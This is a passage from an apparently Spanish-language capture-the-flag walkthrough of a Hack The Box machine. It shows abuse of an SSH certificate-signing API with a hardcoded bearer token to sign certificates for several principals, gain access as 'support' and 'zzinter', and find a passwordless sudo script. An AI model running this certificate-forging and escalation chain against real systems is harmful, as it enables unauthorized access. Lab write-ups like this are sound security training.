+<span id="cb12-25"><a href="#cb12-25" aria-hidden="true"></a>        <span class="bu">echo</span> <span class="st">&quot;Error: &#39;</span><span class="va">$word</span><span class="st">&#39; is not a supported principal.&quot;</span></span>
+<span id="cb12-26"><a href="#cb12-26" aria-hidden="true"></a>        <span class="bu">echo</span> <span class="st">&quot;Choose from:&quot;</span></span>
+<span id="cb12-27"><a href="#cb12-27" aria-hidden="true"></a>        <span class="bu">echo</span> <span class="st">&quot;    webserver - external web servers - webadmin user&quot;</span></span>
+<span id="cb12-28"><a href="#cb12-28" aria-hidden="true"></a>        <span class="bu">echo</span> <span class="st">&quot;    analytics - analytics team databases - analytics user&quot;</span></span>
+<span id="cb12-29"><a href="#cb12-29" aria-hidden="true"></a>        <span class="bu">echo</span> <span class="st">&quot;    support - IT support server - support user&quot;</span></span>
+<span id="cb12-30"><a href="#cb12-30" aria-hidden="true"></a>        <span class="bu">echo</span> <span class="st">&quot;    security - SOC servers - support user&quot;</span></span>
+<span id="cb12-31"><a href="#cb12-31" aria-hidden="true"></a>        <span class="bu">echo</span></span>
+<span id="cb12-32"><a href="#cb12-32" aria-hidden="true"></a>        <span class="ex">usage</span></span>
+<span id="cb12-33"><a href="#cb12-33" aria-hidden="true"></a>    <span class="kw">fi</span></span>
+<span id="cb12-34"><a href="#cb12-34" aria-hidden="true"></a><span class="kw">done</span></span>
+<span id="cb12-35"><a href="#cb12-35" aria-hidden="true"></a></span>
+<span id="cb12-36"><a href="#cb12-36" aria-hidden="true"></a><span class="kw">if</span><span class="bu"> [</span> <span class="ot">!</span> <span class="ot">-f</span> <span class="st">&quot;</span><span class="va">$public_key_file</span><span class="st">&quot;</span><span class="bu"> ]</span>; <span class="kw">then</span></span>
+<span id="cb12-37"><a href="#cb12-37" aria-hidden="true"></a>    <span class="bu">echo</span> <span class="st">&quot;Error: Public key file &#39;</span><span class="va">$public_key_file</span><span class="st">&#39; not found.&quot;</span></span>
+<span id="cb12-38"><a href="#cb12-38" aria-hidden="true"></a>    <span class="ex">usage</span></span>
+<span id="cb12-39"><a href="#cb12-39" aria-hidden="true"></a><span class="kw">fi</span></span>
+<span id="cb12-40"><a href="#cb12-40" aria-hidden="true"></a></span>
+<span id="cb12-41"><a href="#cb12-41" aria-hidden="true"></a><span class="va">public_key=$(</span><span class="fu">cat</span> <span class="va">$public_key_file)</span></span>
+<span id="cb12-42"><a href="#cb12-42" aria-hidden="true"></a></span>
+<span id="cb12-43"><a href="#cb12-43" aria-hidden="true"></a><span class="ex">curl</span> -s signserv.ssg.htb/v1/sign -d <span class="st">&#39;{&quot;pubkey&quot;: &quot;&#39;&quot;</span><span class="va">$public_key</span><span class="st">&quot;&#39;&quot;, &quot;username&quot;: &quot;&#39;&quot;</span><span class="va">$username</span><span class="st">&quot;&#39;&quot;, &quot;principals&quot;: &quot;&#39;&quot;</span><span class="va">$principal</span><span class="st">&quot;&#39;&quot;}&#39;</span> -H <span class="st">&quot;Content-Type: application/json&quot;</span> -H <span class="st">&quot;Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE&quot;</span></span>
+<span id="cb12-44"><a href="#cb12-44" aria-hidden="true"></a><span class="ex">zzinter@itrc</span>:~$ </span></code></pre></div>
+<p>El script toma una clave publica, un nombre de usuario y uno de los elementos de la variable <strong>support_principals</strong> que serían las identidades autorizadas a conectarse como usuarios específicos en el sistema, y si nos fijamos lo envía a un dominio remoto con nombre <strong>signserv.ssg.htb</strong> a través de una petición <strong>POST</strong></p>
+<p>Creamos una clave privada y publica.</p>
+<div class="sourceCode" id="cb13"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true"></a><span class="ex">zzinter@itrc</span>:~$ ssh-keygen </span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true"></a><span class="ex">Generating</span> public/private rsa key pair.</span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true"></a><span class="ex">Enter</span> file in which to save the key (/home/zzinter/.ssh/id_rsa)<span class="bu">:</span> </span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true"></a><span class="ex">Created</span> directory <span class="st">&#39;/home/zzinter/.ssh&#39;</span>.</span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true"></a><span class="ex">Enter</span> passphrase (empty for no passphrase)<span class="bu">:</span> </span>
+<span id="cb13-6"><a href="#cb13-6" aria-hidden="true"></a><span class="ex">Enter</span> same passphrase again: </span>
+<span id="cb13-7"><a href="#cb13-7" aria-hidden="true"></a><span class="ex">Your</span> identification has been saved in /home/zzinter/.ssh/id_rsa</span>
+<span id="cb13-8"><a href="#cb13-8" aria-hidden="true"></a><span class="ex">Your</span> public key has been saved in /home/zzinter/.ssh/id_rsa.pub</span>
+<span id="cb13-9"><a href="#cb13-9" aria-hidden="true"></a><span class="ex">The</span> key fingerprint is:</span>
+<span id="cb13-10"><a href="#cb13-10" aria-hidden="true"></a><span class="ex">SHA256</span>:dWOMy7LPKPwMkVzu7JgHukV4PU4ym05sbG/UCvejydA zzinter@itrc</span>
+<span id="cb13-11"><a href="#cb13-11" aria-hidden="true"></a><span class="ex">The</span> key<span class="st">&#39;s randomart image is:</span></span>
+<span id="cb13-12"><a href="#cb13-12" aria-hidden="true"></a><span class="st">+---[RSA 3072]----+</span></span>
+<span id="cb13-13"><a href="#cb13-13" aria-hidden="true"></a><span class="st">|                 |</span></span>
+<span id="cb13-14"><a href="#cb13-14" aria-hidden="true"></a><span class="st">|           o     |</span></span>
+<span id="cb13-15"><a href="#cb13-15" aria-hidden="true"></a><span class="st">|        . o =    |</span></span>
+<span id="cb13-16"><a href="#cb13-16" aria-hidden="true"></a><span class="st">|     o = o + .   |</span></span>
+<span id="cb13-17"><a href="#cb13-17" aria-hidden="true"></a><span class="st">|    . O S.o      |</span></span>
+<span id="cb13-18"><a href="#cb13-18" aria-hidden="true"></a><span class="st">|     =o%o+.      |</span></span>
+<span id="cb13-19"><a href="#cb13-19" aria-hidden="true"></a><span class="st">|     o%=Eo       |</span></span>
+<span id="cb13-20"><a href="#cb13-20" aria-hidden="true"></a><span class="st">|    .*oX+=o      |</span></span>
+<span id="cb13-21"><a href="#cb13-21" aria-hidden="true"></a><span class="st">|    ..+=X.o.     |</span></span>
+<span id="cb13-22"><a href="#cb13-22" aria-hidden="true"></a><span class="st">+----[SHA256]-----+</span></span>
+<span id="cb13-23"><a href="#cb13-23" aria-hidden="true"></a><span class="st">zzinter@itrc:~$                </span></span></code></pre></div>
+<p>Creamos un certificado para cada uno de las identidades autorizadas</p>
+<div class="sourceCode" id="cb14"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true"></a><span class="ex">zzinter@itrc</span>:~$ bash sign_key_api.sh .ssh/id_rsa.pub test webserver <span class="op">&gt;</span> webserver-cert</span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true"></a><span class="ex">zzinter@itrc</span>:~$ bash sign_key_api.sh .ssh/id_rsa.pub test analytics <span class="op">&gt;</span> analytics-cert</span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true"></a><span class="ex">zzinter@itrc</span>:~$ bash sign_key_api.sh .ssh/id_rsa.pub test support <span class="op">&gt;</span> support-cert</span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true"></a><span class="ex">zzinter@itrc</span>:~$ bash sign_key_api.sh .ssh/id_rsa.pub test security <span class="op">&gt;</span> security-cert</span></code></pre></div>
+<p>Y probamos cual de las certificaciones nos permite acceder, pero ahora a través del puerto <strong>2222</strong> que es el puerto <strong>SSH</strong> de la máquina host.</p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true"></a><span class="ex">zzinter@itrc</span>:~$ ssh -o CertificateFile=webserver-cert -i .ssh/id_rsa webserver@172.223.0.1 -p 2222                                                                                     </span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true"></a><span class="ex">webserver@172.223.0.1</span><span class="st">&#39;s password: </span></span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true"></a></span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true"></a><span class="st">zzinter@itrc:~$ ssh -o CertificateFile=analytics-cert -i .ssh/id_rsa analytics@172.223.0.1 -p 2222                                                                                     </span></span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true"></a><span class="st">analytics@172.223.0.1&#39;</span>s password: </span>
+<span id="cb15-6"><a href="#cb15-6" aria-hidden="true"></a></span>
+<span id="cb15-7"><a href="#cb15-7" aria-hidden="true"></a><span class="ex">zzinter@itrc</span>:~$ ssh -o CertificateFile=support-cert -i .ssh/id_rsa support@172.223.0.1 -p 2222                                                                                         </span>
+<span id="cb15-8"><a href="#cb15-8" aria-hidden="true"></a><span class="ex">Welcome</span> to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-117-generic x86_64)</span>
+<span id="cb15-9"><a href="#cb15-9" aria-hidden="true"></a></span>
+<span id="cb15-10"><a href="#cb15-10" aria-hidden="true"></a> <span class="ex">*</span> Documentation:  https://help.ubuntu.com</span>
+<span id="cb15-11"><a href="#cb15-11" aria-hidden="true"></a> <span class="ex">*</span> Management:     https://landscape.canonical.com</span>
+<span id="cb15-12"><a href="#cb15-12" aria-hidden="true"></a> <span class="ex">*</span> Support:        https://ubuntu.com/pro</span>
+<span id="cb15-13"><a href="#cb15-13" aria-hidden="true"></a></span>
+<span id="cb15-14"><a href="#cb15-14" aria-hidden="true"></a> <span class="ex">System</span> information as of Sun Feb  9 10:13:39 AM UTC 2025</span>
+<span id="cb15-15"><a href="#cb15-15" aria-hidden="true"></a></span>
+<span id="cb15-16"><a href="#cb15-16" aria-hidden="true"></a>  <span class="ex">System</span> load:  0.07               Processes:             240</span>
+<span id="cb15-17"><a href="#cb15-17" aria-hidden="true"></a>  <span class="ex">Usage</span> of /:   76.6% of 10.73GB   Users logged in:       0</span>
+<span id="cb15-18"><a href="#cb15-18" aria-hidden="true"></a>  <span class="ex">Memory</span> usage: 12%                IPv4 address for eth0: 10.10.11.27</span>
+<span id="cb15-19"><a href="#cb15-19" aria-hidden="true"></a>  <span class="ex">Swap</span> usage:   0%</span>
+<span id="cb15-20"><a href="#cb15-20" aria-hidden="true"></a></span>
+<span id="cb15-21"><a href="#cb15-21" aria-hidden="true"></a></span>
+<span id="cb15-22"><a href="#cb15-22" aria-hidden="true"></a><span class="ex">Expanded</span> Security Maintenance for Applications is not enabled.</span>
+<span id="cb15-23"><a href="#cb15-23" aria-hidden="true"></a></span>
+<span id="cb15-24"><a href="#cb15-24" aria-hidden="true"></a><span class="ex">0</span> updates can be applied immediately.</span>
+<span id="cb15-25"><a href="#cb15-25" aria-hidden="true"></a></span>
+<span id="cb15-26"><a href="#cb15-26" aria-hidden="true"></a><span class="ex">Enable</span> ESM Apps to receive additional future security updates.</span>
+<span id="cb15-27"><a href="#cb15-27" aria-hidden="true"></a><span class="ex">See</span> https://ubuntu.com/esm or run: sudo pro status</span>
+<span id="cb15-28"><a href="#cb15-28" aria-hidden="true"></a></span>
+<span id="cb15-29"><a href="#cb15-29" aria-hidden="true"></a></span>
+<span id="cb15-30"><a href="#cb15-30" aria-hidden="true"></a><span class="ex">The</span> list of available updates is more than a week old.</span>
+<span id="cb15-31"><a href="#cb15-31" aria-hidden="true"></a><span class="ex">To</span> check for new updates run: sudo apt update</span>
+<span id="cb15-32"><a href="#cb15-32" aria-hidden="true"></a><span class="ex">Failed</span> to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span>
+<span id="cb15-33"><a href="#cb15-33" aria-hidden="true"></a></span>
+<span id="cb15-34"><a href="#cb15-34" aria-hidden="true"></a></span>
+<span id="cb15-35"><a href="#cb15-35" aria-hidden="true"></a><span class="ex">Last</span> login: Sun Feb  9 09:50:55 2025 from 172.223.0.3</span>
+<span id="cb15-36"><a href="#cb15-36" aria-hidden="true"></a><span class="ex">support@ssg</span>:~$ </span></code></pre></div>
+<p>El certificado que si nos permite acceder es el de <strong>support</strong>, buscando por directorios vemos el <strong>/etc/ssh/auth_principals/</strong> que contienen una lista de <strong>principals</strong> que tienen permiso para autenticarse como ese usuario.</p>
+<div class="sourceCode" id="cb16"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true"></a><span class="ex">support@ssg</span>:~$ ls -la /etc/ssh/auth_principals/</span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true"></a><span class="ex">total</span> 20</span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true"></a><span class="ex">drwxr-xr-x</span> 2 root root 4096 Feb  8  2024 .</span>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true"></a><span class="ex">drwxr-xr-x</span> 5 root root 4096 Jul 24  2024 ..</span>
+<span id="cb16-5"><a href="#cb16-5" aria-hidden="true"></a><span class="ex">-rw-r--r--</span> 1 root root   10 Feb  8  2024 root</span>
+<span id="cb16-6"><a href="#cb16-6" aria-hidden="true"></a><span class="ex">-rw-r--r--</span> 1 root root   18 Feb  8  2024 support</span>
+<span id="cb16-7"><a href="#cb16-7" aria-hidden="true"></a><span class="ex">-rw-r--r--</span> 1 root root   13 Feb  8  2024 zzinter</span>
+<span id="cb16-8"><a href="#cb16-8" aria-hidden="true"></a><span class="ex">support@ssg</span>:~$ cat /etc/ssh/auth_principals/root     </span>
+<span id="cb16-9"><a href="#cb16-9" aria-hidden="true"></a><span class="ex">root_user</span></span>
+<span id="cb16-10"><a href="#cb16-10" aria-hidden="true"></a><span class="ex">support@ssg</span>:~$ cat /etc/ssh/auth_principals/support </span>
+<span id="cb16-11"><a href="#cb16-11" aria-hidden="true"></a><span class="ex">support</span></span>
+<span id="cb16-12"><a href="#cb16-12" aria-hidden="true"></a><span class="ex">root_user</span></span>
+<span id="cb16-13"><a href="#cb16-13" aria-hidden="true"></a><span class="ex">support@ssg</span>:~$ cat /etc/ssh/auth_principals/zzinter </span>
+<span id="cb16-14"><a href="#cb16-14" aria-hidden="true"></a><span class="ex">zzinter_temp</span></span>
+<span id="cb16-15"><a href="#cb16-15" aria-hidden="true"></a><span class="ex">support@ssg</span>:~$  </span></code></pre></div>
+<p>En este caso vemos 2 principals nuevos, <strong>root_user</strong> para los usuarios root y support y <strong>zzinter_temp</strong> para el usuario zzinter.</p>
+<p>Volvemos al contenedor y añadimos esos nombres de <strong>principals</strong> al nuevo nuevo script.</p>
+<div class="sourceCode" id="cb17"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true"></a><span class="ex">zzinter@itrc</span>:~$ cat /tmp/sign_key_api.sh </span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true"></a><span class="co">#!/bin/bash</span></span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true"></a></span>
+<span id="cb17-4"><a href="#cb17-4" aria-hidden="true"></a><span class="fu">usage ()</span> <span class="kw">{</span></span>
+<span id="cb17-5"><a href="#cb17-5" aria-hidden="true"></a>    <span class="bu">echo</span> <span class="st">&quot;Usage: </span><span class="va">$0</span><span class="st"> &lt;public_key_file&gt; &lt;username&gt; &lt;principal&gt;&quot;</span></span>
+<span id="cb17-6"><a href="#cb17-6" aria-hidden="true"></a>    <span class="bu">exit</span> 1</span>
+<span id="cb17-7"><a href="#cb17-7" aria-hidden="true"></a><span class="kw">}</span></span>
+<span id="cb17-8"><a href="#cb17-8" aria-hidden="true"></a></span>
+<span id="cb17-9"><a href="#cb17-9" aria-hidden="true"></a><span class="kw">if</span><span class="bu"> [</span> <span class="st">&quot;</span><span class="va">$#</span><span class="st">&quot;</span> <span class="ot">-ne</span> 3<span class="bu"> ]</span>; <span class="kw">then</span></span>
+<span id="cb17-10"><a href="#cb17-10" aria-hidden="true"></a>    <span class="ex">usage</span></span>
+<span id="cb17-11"><a href="#cb17-11" aria-hidden="true"></a><span class="kw">fi</span></span>
+<span id="cb17-12"><a href="#cb17-12" aria-hidden="true"></a></span>
+<span id="cb17-13"><a href="#cb17-13" aria-hidden="true"></a><span class="va">public_key_file=</span><span class="st">&quot;</span><span class="va">$1</span><span class="st">&quot;</span></span>
+<span id="cb17-14"><a href="#cb17-14" aria-hidden="true"></a><span class="va">username=</span><span class="st">&quot;</span><span class="va">$2</span><span class="st">&quot;</span></span>
+<span id="cb17-15"><a href="#cb17-15" aria-hidden="true"></a><span class="va">principal_str=</span><span class="st">&quot;</span><span class="va">$3</span><span class="st">&quot;</span></span>
+<span id="cb17-16"><a href="#cb17-16" aria-hidden="true"></a></span>
+<span id="cb17-17"><a href="#cb17-17" aria-hidden="true"></a><span class="va">supported_principals=</span><span class="st">&quot;webserver,analytics,support,security,root_user,zzinter_temp&quot;</span></span>
+<span id="cb17-18"><a href="#cb17-18" aria-hidden="true"></a><span class="va">IFS=</span><span class="st">&#39;,&#39;</span> <span class="bu">read</span> -ra <span class="va">principal</span> <span class="op">&lt;&lt;&lt;</span> <span class="st">&quot;</span><span class="va">$principal_str</span><span class="st">&quot;</span></span>
+<span id="cb17-19"><a href="#cb17-19" aria-hidden="true"></a><span class="kw">for</span> <span class="ex">word</span> in <span class="st">&quot;</span><span class="va">${principal[@]}</span><span class="st">&quot;</span><span class="kw">;</span> <span class="kw">do</span></span>
+<span id="cb17-20"><a href="#cb17-20" aria-hidden="true"></a>    <span class="kw">if</span> ! <span class="bu">echo</span> <span class="st">&quot;</span><span class="va">$supported_principals</span><span class="st">&quot;</span> <span class="kw">|</span> <span class="fu">grep</span> -qw <span class="st">&quot;</span><span class="va">$word</span><span class="st">&quot;</span><span class="kw">;</span> <span class="kw">then</span></span>
+<span id="cb17-21"><a href="#cb17-21" aria-hidden="true"></a>        <span class="bu">echo</span> <span class="st">&quot;Error: &#39;</span><span class="va">$word</span><span class="st">&#39; is not a supported principal.&quot;</span></span>
+<span id="cb17-22"><a href="#cb17-22" aria-hidden="true"></a>        <span class="bu">echo</span> <span class="st">&quot;Choose from:&quot;</span></span>
+<span id="cb17-23"><a href="#cb17-23" aria-hidden="true"></a>        <span class="bu">echo</span> <span class="st">&quot;    webserver - external web servers - webadmin user&quot;</span></span>
+<span id="cb17-24"><a href="#cb17-24" aria-hidden="true"></a>        <span class="bu">echo</span> <span class="st">&quot;    analytics - analytics team databases - analytics user&quot;</span></span>
+<span id="cb17-25"><a href="#cb17-25" aria-hidden="true"></a>        <span class="bu">echo</span> <span class="st">&quot;    support - IT support server - support user&quot;</span></span>
+<span id="cb17-26"><a href="#cb17-26" aria-hidden="true"></a>        <span class="bu">echo</span> <span class="st">&quot;    security - SOC servers - support user&quot;</span></span>
+<span id="cb17-27"><a href="#cb17-27" aria-hidden="true"></a>        <span class="bu">echo</span></span>
+<span id="cb17-28"><a href="#cb17-28" aria-hidden="true"></a>        <span class="ex">usage</span></span>
+<span id="cb17-29"><a href="#cb17-29" aria-hidden="true"></a>    <span class="kw">fi</span></span>
+<span id="cb17-30"><a href="#cb17-30" aria-hidden="true"></a><span class="kw">done</span></span>
+<span id="cb17-31"><a href="#cb17-31" aria-hidden="true"></a></span>
+<span id="cb17-32"><a href="#cb17-32" aria-hidden="true"></a><span class="kw">if</span><span class="bu"> [</span> <span class="ot">!</span> <span class="ot">-f</span> <span class="st">&quot;</span><span class="va">$public_key_file</span><span class="st">&quot;</span><span class="bu"> ]</span>; <span class="kw">then</span></span>
+<span id="cb17-33"><a href="#cb17-33" aria-hidden="true"></a>    <span class="bu">echo</span> <span class="st">&quot;Error: Public key file &#39;</span><span class="va">$public_key_file</span><span class="st">&#39; not found.&quot;</span></span>
+<span id="cb17-34"><a href="#cb17-34" aria-hidden="true"></a>    <span class="ex">usage</span></span>
+<span id="cb17-35"><a href="#cb17-35" aria-hidden="true"></a><span class="kw">fi</span></span>
+<span id="cb17-36"><a href="#cb17-36" aria-hidden="true"></a></span>
+<span id="cb17-37"><a href="#cb17-37" aria-hidden="true"></a><span class="va">public_key=$(</span><span class="fu">cat</span> <span class="va">$public_key_file)</span></span>
+<span id="cb17-38"><a href="#cb17-38" aria-hidden="true"></a></span>
+<span id="cb17-39"><a href="#cb17-39" aria-hidden="true"></a><span class="ex">curl</span> -s signserv.ssg.htb/v1/sign -d <span class="st">&#39;{&quot;pubkey&quot;: &quot;&#39;&quot;</span><span class="va">$public_key</span><span class="st">&quot;&#39;&quot;, &quot;username&quot;: &quot;&#39;&quot;</span><span class="va">$username</span><span class="st">&quot;&#39;&quot;, &quot;principals&quot;: &quot;&#39;&quot;</span><span class="va">$principal</span><span class="st">&quot;&#39;&quot;}&#39;</span> -H <span class="st">&quot;Content-Type: application/json&quot;</span> -H <span class="st">&quot;Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE&quot;</span></span>
+<span id="cb17-40"><a href="#cb17-40" aria-hidden="true"></a><span class="ex">zzinter@itrc</span>:~$ </span></code></pre></div>
+<p>Al creamos los certificados, vemos que solo nos permite crear el de <strong>zzinter_temp</strong>.</p>
+<div class="sourceCode" id="cb18"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true"></a><span class="ex">zzinter@itrc</span>:~$ bash /tmp/sign_key_api.sh .ssh/id_rsa.pub test root_user</span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true"></a>{<span class="st">&quot;detail&quot;</span>:<span class="st">&quot;Root access must be granted manually. See the IT admin staff.&quot;</span>}</span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true"></a><span class="ex">zzinter@itrc</span>:~$ bash /tmp/sign_key_api.sh .ssh/id_rsa.pub test zzinter_temp</span>
+<span id="cb18-4"><a href="#cb18-4" aria-hidden="true"></a><span class="ex">ssh-rsa-cert-v01@openssh.com</span> AAAAHHNzaC1yc2EtY2VydC12MDFAb3BlbnNzaC5jb20AAAAgO0IZwKaBknnH55DX45YmN6a4y6J9DwlBoK3uzQf8ijEAAAADAQABAAABgQCoBINXBDoT7LJNECgtCco1KFJwPujAHDK31kXaiJY5rdev9Z2GbSXd0fN4Rb73rzQmyuHAZ/31MLR4qNFvKalIOXThFn5pEmCCk/kEbVyMqW0oW13gynJu1gvR8tK9SZl540zxR7eyIRS/5o1PNQotbdyWZSZ7K4H8py9a6ypf5vg0MA3T/XcISw02JHZCGMvS+7562sCdq/RQ6tWDbOgKJ+JGNq8wn5YI98kvQxATUonMsVuPQYTgobeg6v/RhE4awu0gzhBdzHaTlmmEt9dkFBQRdyduZHkzs/kcHBUODRWHFYGQwAeVbdBsiqCGw2nWCtCws7KfbaX8u3GXVCa1qjVoxJ/vfIGG3cMKHEBRy8929dG9eyrSdwy9Hf4XSJizzN9sv90hCwjNhB0xqsJEksuLC2nzv9FZbiy6H8LsNI5PcvcUI+3wORm0f9Avd4ezbH+W3o8xFa3fSU4/GYCer0hdAVgtRKfrG0cceXjPZCvcB5QIXaJeDGEj5FGnBWkAAAAAAAAALAAAAAEAAAAEdGVzdAAAABAAAAAMenppbnRlcl90ZW1wAAAAAGefSV3//////////wAAAAAAAACCAAAAFXBlcm1pdC1YMTEtZm9yd2FyZGluZwAAAAAAAAAXcGVybWl0LWFnZW50LWZvcndhcmRpbmcAAAAAAAAAFnBlcm1pdC1wb3J0LWZvcndhcmRpbmcAAAAAAAAACnBlcm1pdC1wdHkAAAAAAAAADnBlcm1pdC11c2VyLXJjAAAAAAAAAAAAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIIHg8Cudy1ShyYfqzC3ANlgAcW7Q4MoZuezAE8mNFSmxAAAAUwAAAAtzc2gtZWQyNTUxOQAAAED8aXYAGX+JZWGTonfEBr2RNhki+k8bRE4WUEf3YFPkOBs8FKYC9j8hIyYNySvHMisWsfc/Ga/AOIstm3r+FQgE zzinter@itrc</span>
+<span id="cb18-5"><a href="#cb18-5" aria-hidden="true"></a><span class="ex">zzinter@itrc</span>:~$ </span></code></pre></div>
+<p>Accedemos como el usuario <strong>zzinter</strong> y vemos que si que funciona.</p>
+<div class="sourceCode" id="cb19"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true"></a><span class="ex">zzinter@itrc</span>:~$ ssh -o CertificateFile=zzinter_temp-cert -i .ssh/id_rsa zzinter@172.223.0.1 -p 2222</span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true"></a><span class="ex">Welcome</span> to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-117-generic x86_64)</span>
+<span id="cb19-3"><a href="#cb19-3" aria-hidden="true"></a></span>
+<span id="cb19-4"><a href="#cb19-4" aria-hidden="true"></a> <span class="ex">*</span> Documentation:  https://help.ubuntu.com</span>
+<span id="cb19-5"><a href="#cb19-5" aria-hidden="true"></a> <span class="ex">*</span> Management:     https://landscape.canonical.com</span>
+<span id="cb19-6"><a href="#cb19-6" aria-hidden="true"></a> <span class="ex">*</span> Support:        https://ubuntu.com/pro</span>
+<span id="cb19-7"><a href="#cb19-7" aria-hidden="true"></a></span>
+<span id="cb19-8"><a href="#cb19-8" aria-hidden="true"></a> <span class="ex">System</span> information as of Sun Feb  9 10:41:31 AM UTC 2025</span>
+<span id="cb19-9"><a href="#cb19-9" aria-hidden="true"></a></span>
+<span id="cb19-10"><a href="#cb19-10" aria-hidden="true"></a>  <span class="ex">System</span> load:  0.0                Processes:             240</span>
+<span id="cb19-11"><a href="#cb19-11" aria-hidden="true"></a>  <span class="ex">Usage</span> of /:   76.7% of 10.73GB   Users logged in:       0</span>
+<span id="cb19-12"><a href="#cb19-12" aria-hidden="true"></a>  <span class="ex">Memory</span> usage: 12%                IPv4 address for eth0: 10.10.11.27</span>
+<span id="cb19-13"><a href="#cb19-13" aria-hidden="true"></a>  <span class="ex">Swap</span> usage:   0%</span>
+<span id="cb19-14"><a href="#cb19-14" aria-hidden="true"></a></span>
+<span id="cb19-15"><a href="#cb19-15" aria-hidden="true"></a></span>
+<span id="cb19-16"><a href="#cb19-16" aria-hidden="true"></a><span class="ex">Expanded</span> Security Maintenance for Applications is not enabled.</span>
+<span id="cb19-17"><a href="#cb19-17" aria-hidden="true"></a></span>
+<span id="cb19-18"><a href="#cb19-18" aria-hidden="true"></a><span class="ex">0</span> updates can be applied immediately.</span>
+<span id="cb19-19"><a href="#cb19-19" aria-hidden="true"></a></span>
+<span id="cb19-20"><a href="#cb19-20" aria-hidden="true"></a><span class="ex">Enable</span> ESM Apps to receive additional future security updates.</span>
+<span id="cb19-21"><a href="#cb19-21" aria-hidden="true"></a><span class="ex">See</span> https://ubuntu.com/esm or run: sudo pro status</span>
+<span id="cb19-22"><a href="#cb19-22" aria-hidden="true"></a></span>
+<span id="cb19-23"><a href="#cb19-23" aria-hidden="true"></a></span>
+<span id="cb19-24"><a href="#cb19-24" aria-hidden="true"></a><span class="ex">The</span> list of available updates is more than a week old.</span>
+<span id="cb19-25"><a href="#cb19-25" aria-hidden="true"></a><span class="ex">To</span> check for new updates run: sudo apt update</span>
+<span id="cb19-26"><a href="#cb19-26" aria-hidden="true"></a><span class="ex">Failed</span> to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span>
+<span id="cb19-27"><a href="#cb19-27" aria-hidden="true"></a></span>
+<span id="cb19-28"><a href="#cb19-28" aria-hidden="true"></a></span>
+<span id="cb19-29"><a href="#cb19-29" aria-hidden="true"></a><span class="ex">Last</span> login: Sun Feb  9 10:34:09 2025 from 172.223.0.3</span>
+<span id="cb19-30"><a href="#cb19-30" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ hostname -I</span>
+<span id="cb19-31"><a href="#cb19-31" aria-hidden="true"></a><span class="ex">10.10.11.27</span> 172.17.0.1 172.21.0.1 172.223.0.1 </span>
+<span id="cb19-32"><a href="#cb19-32" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ </span></code></pre></div>
+<p>Si miramos los permisos que tenemos, vemos que podemos ejecutar cierto script como el usuario <strong>root</strong> y sin proporcionar la contraseña.</p>
+<div class="sourceCode" id="cb20"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ sudo -l</span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true"></a><span class="ex">Matching</span> Defaults entries for zzinter on ssg:</span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true"></a>    <span class="ex">env_reset</span>, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span>
+<span id="cb20-4"><a href="#cb20-4" aria-hidden="true"></a></span>
+<span id="cb20-5"><a href="#cb20-5" aria-hidden="true"></a><span class="ex">User</span> zzinter may run the following commands on ssg:</span>
+<span id="cb20-6"><a href="#cb20-6" aria-hidden="true"></a>    <span class="kw">(</span><span class="ex">root</span><span class="kw">)</span> <span class="ex">NOPASSWD</span>: /opt/sign_key.sh</span>
+<span id="cb20-7"><a href="#cb20-7" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ </span></code></pre></div>
+<p>Si miramos el código del script vemos que está creando un certificado</p>
+<div class="sourceCode" id="cb21"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ cat /opt/sign_key.sh </span>
